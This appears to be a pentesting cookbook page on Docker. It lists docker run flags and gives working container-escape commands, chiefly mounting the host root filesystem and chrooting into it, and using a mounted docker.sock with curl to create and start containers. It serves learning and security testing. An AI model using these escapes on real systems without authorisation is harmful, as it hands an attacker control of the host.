---
layout: default
title: Docker
parent: COOKBOOKS
has_children: false
has_toc: false
---

{% include toc.html %}

## References

[PrivEsc with docker](https://medium.com/@Affix/privilege-escallation-with-docker-56dc682a6e17)

[Docker socket](https://medium.com/better-programming/about-var-run-docker-sock-3bfd276e12fd)

[GTFOBins docker page](https://gtfobins.github.io/gtfobins/docker/)

[Docker run command](https://docs.docker.com/engine/reference/commandline/container_run/)

[Docker api reference](https://docs.docker.com/engine/api/v1.40/#)

## Docker run
See the [docker run cli reference](https://docs.docker.com/engine/reference/commandline/container_run/) for more details and a full list of options.

|Command|Description|
|:---|:---|
|`--rm`|Automatically remove the container when finished.|
|`--interactive`, `-i`|Start the container in interactive mode so you can use it.|
|`--tty`, `-t`|Start a `tty` so you can interactive with the container.|
|`--volume`, `-v`|Mount a volume at the specified location.|
|`--volume /:/mnt`|Mount the root of the host to `/mnt` within the container.|
|`--volume /root:/mnt`|Mount root's home folder of the host to `/mnt/` within the container.|

## Docker escapes using docker run
You'll need a `docker` binary in the container in order to use `docker run`. If you have a shell on the host system you can check if the host and the container are on the same network. If they are, you may be able to `wget` the docker binary from the host to the container.

```
// Download the 'hello-world' container from the docker repo and run it.
docker run hello-world

// Run the 'ubuntu' container in interactive mode with a tty and execute the command /bin/bash to return a shell and automatically clean up once complete.
docker run --rm --interactive --tty ubuntu /bin/bash

// Shorthand version of the same command.
docker run --rm -it ubuntu /bin/bash

// Mount the entire / volume of the host machine to /mnt within the container 'ubuntu' and performs a 'chroot' on /mnt inside the container.
docker run --rm --volume /:/mnt -it ubuntu chroot /mnt

// Mount the /root directory of the host machine to /mnt within the container.
docker run --rm --volume /root:/mnt -it ubuntu
```

## Docker socket
If there is a `docker.sock` socket in `/var/run/` of the container, you can communicate with the docker daemon on the host (see [this article](https://medium.com/better-programming/about-var-run-docker-sock-3bfd276e12fd) for more details). Most of the docker endpoints are mapped to commands, for example `GET http://localhost/containers/json` maps to `docker ps`. See the right-hand side of the [docker specification](https://docs.docker.com/engine/api/v1.40/#) page for details of the endpoints. For example:

```
// Request the summary image data..
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

`POST` can be used to do things like create and run containers, for example:

```
// Create a container via the docker.sock socket.
curl -X POST --unix-socket /var/run/docker.sock -d '{"Image":"nginx"}' -H 'Content-Type: application/json' http://localhost/containers/create

{"Id":"age65...g45","Warnings":null}

// Start the container.
curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/age65...g45/start
```